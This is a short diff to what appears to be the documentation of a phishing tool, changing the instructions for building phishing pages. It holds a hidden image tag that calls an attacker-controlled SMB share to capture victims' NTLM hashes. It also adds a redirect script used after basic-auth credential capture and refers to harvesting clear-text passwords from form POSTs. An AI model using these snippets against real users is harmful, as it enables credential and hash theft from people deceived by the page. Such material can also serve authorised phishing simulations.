@@ -86,9 +86,15 @@ In your phishing page (`present.html`), use variables like the following for add
 # you provide or an optionally specified IP address:
 <img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
 
-# The following line will leverage optionally specified URL redirection. This is handy for when used with
+# The following will leverage optionally specified URL redirection. This is handy when used with
 # basic authentication to redirect to a valid site. This line is built in to the microsoft-azure template:
-<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
+    <script>
+	    var url = "$redirectUrl";
+    	    if (url != "") {
+	    	document.location = url;
+	    }
+    </script>
+
 
 # If using an HTTP form to capture clear-text credentials, use code like the following. The tool will monitor
 # POSTs to this URL for credentials:
